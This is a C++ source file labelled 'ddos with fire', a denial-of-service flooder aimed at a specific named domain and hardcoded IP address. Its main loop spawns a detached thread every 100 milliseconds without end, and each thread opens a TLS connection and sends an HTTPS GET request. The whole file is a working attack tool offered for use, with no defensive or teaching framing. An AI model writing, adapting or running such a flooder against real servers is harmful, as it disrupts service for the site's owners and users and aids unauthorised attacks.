// ddos with fire

#include <iostream>
#include <string>
#include <thread>
#include <vector>
#include <array>
#include <cstring>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <openssl/ssl.h>
#include <openssl/err.h>

class FireAndForget {
public:
    template <typename Func>
    void operator<<(Func&& func) {
        std::thread(std::forward<Func>(func)).detach();
    }
};

FireAndForget fire;

void makeRequest(const std::string& host, int port) {
    SSL_CTX* ctx = SSL_CTX_new(TLS_client_method());
    if (!ctx) {
        std::cerr << "Unable to create SSL context" << std::endl;
        return;
    }

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        std::cerr << "Error creating socket" << std::endl;
        SSL_CTX_free(ctx);
        return;
    }

    sockaddr_in server_address;
    server_address.sin_family = AF_INET;
    server_address.sin_port = htons(port);
    
    if (inet_pton(AF_INET, "185.116.161.110", &server_address.sin_addr) <= 0) {
        std::cerr << "Invalid address/ Address not supported" << std::endl;
        close(sock);
        SSL_CTX_free(ctx);
        return;
    }

    if (connect(sock, (struct sockaddr*)&server_address, sizeof(server_address)) < 0) {
        std::cerr << "Connection failed" << std::endl;
        close(sock);
        SSL_CTX_free(ctx);
        return;
    }

    SSL* ssl = SSL_new(ctx);
    SSL_set_fd(ssl, sock);

    if (SSL_connect(ssl) <= 0) {
        std::cerr << "SSL connection failed" << std::endl;
        SSL_free(ssl);
        close(sock);
        SSL_CTX_free(ctx);
        return;
    }

    std::string request = "GET / HTTP/1.1\r\nHost: " + host + "\r\nConnection: close\r\n\r\n";
    ssize_t sent_bytes = SSL_write(ssl, request.c_str(), request.size());
    if (sent_bytes < 0) {
        std::cerr << "Error sending request" << std::endl;
        SSL_free(ssl);
        close(sock);
        SSL_CTX_free(ctx);
        return;
    }

    std::array<char, 4096> buffer;
    std::string response;
    while (true) {
        ssize_t bytes_received = SSL_read(ssl, buffer.data(), buffer.size());
        if (bytes_received <= 0) {
            break;
        }
        response.append(buffer.data(), bytes_received);
    }

    std::cout << "Response: " << response << "\n\n";

    SSL_shutdown(ssl);
    SSL_free(ssl);
    close(sock);
    SSL_CTX_free(ctx);
}

int main() {
    const std::string host = "www.mahaksoft.com"; // Domain name
    const int port = 443; // HTTPS port

    while (true) {
        fire << [&]() { makeRequest(host, port); };
        std::this_thread::sleep_for(std::chrono::milliseconds(100)); // Adjust rate limit as needed
    }

    return 0;
}
